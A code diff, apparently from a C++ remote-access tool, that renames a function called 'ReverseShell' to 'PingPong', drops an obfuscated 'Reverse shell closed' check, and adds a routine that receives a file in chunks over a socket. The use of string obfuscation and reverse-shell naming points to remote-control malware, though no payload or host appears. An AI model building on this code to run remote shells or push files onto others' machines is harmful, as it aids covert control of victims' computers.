@@ -103,18 +103,54 @@ public:
 		return NC;
 	}
 	
-	static string ReverseShell(SOCKET Sock, string Res)
+	static string PingPong(SOCKET Sock, string Res)
 	{
 		string Buff = "";
 		
 		if (!TcpIP::SendString(Sock, Res))
 			return "";
 		
-		if (Res != (string)AY_OBFUSCATE("Reverse shell closed"))
-			if (!TcpIP::RecvString(Sock, Buff))
-				return "";
+		if (!TcpIP::RecvString(Sock, Buff))
+			return "";
 
 		return Buff;
+	}
+
+	static bool DownloadFileWithLoading(SOCKET Sock, string& FileName, string& FileContent)
+	{
+		string strFileSize;
+		string Buff = "";
+
+		if (!TcpIP::RecvString(Sock, FileName))
+			return false;
+
+		if (!TcpIP::RecvString(Sock, strFileSize))
+			return false;
+
+		int FileSize = stoi(strFileSize);
+
+		if (FileSize > 100)
+		{
+			int ChunkSize = FileSize / 100;
+			int ChunkNumber = FileSize / ChunkSize;
+
+			for (int i = 0; i < ChunkNumber; i++)
+			{
+				if (!TcpIP::RecvString(Sock, Buff))
+					return false;
+
+				FileContent += Buff;
+				Buff.clear();
+			}
+		}
+		else
+		{
+			if (!TcpIP::RecvString(Sock, FileContent))
+				return false;
+
+		}
+
+		return true;
 	}
 };
 
